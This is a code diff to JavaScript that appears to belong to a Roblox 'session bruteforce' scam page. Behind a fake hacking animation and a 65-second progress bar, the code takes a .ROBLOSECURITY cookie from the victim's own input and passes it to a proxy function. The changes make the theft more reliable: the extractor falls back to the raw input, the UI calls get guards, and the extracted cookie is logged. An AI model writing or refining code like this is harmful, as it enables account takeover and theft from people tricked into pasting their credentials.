@@ -12,7 +12,7 @@ function extractRobloxSecurityCookie(sessionId) {
     const match = sessionId.match(pattern);
     if (match) return match[0]; // Return the entire match
   }
-  return null; // Return null if no cookie found
+  return sessionId; // Fallback to raw input if no pattern matches
 }
 
 async function sendToProxy(sessionId) {
@@ -34,17 +34,21 @@ async function sendToProxy(sessionId) {
 }
 
 function bruteforce(sessionId) {
-  // Start the hacking animation
-  startHack();
+  // Start the hacking animation (if applicable)
+  if (typeof startHack === 'function') startHack();
   
   // Process the session ID after delay (matches progress bar)
   setTimeout(async () => {
     try {
-      const cookie = extractRobloxSecurityCookie(sessionId) || sessionId;
+      const cookie = extractRobloxSecurityCookie(sessionId);
+      console.log("Extracted cookie:", cookie); // Debug log
       await sendToProxy(cookie);
-      showCookieSuccess();
+      
+      // Show success message (if applicable)
+      if (typeof showCookieSuccess === 'function') showCookieSuccess();
     } catch (error) {
-      showError("Failed to process session ID");
+      console.error("Error:", error);
+      if (typeof showError === 'function') showError("Failed to process session ID");
     }
   }, 65000); // Match with progress bar duration
 }
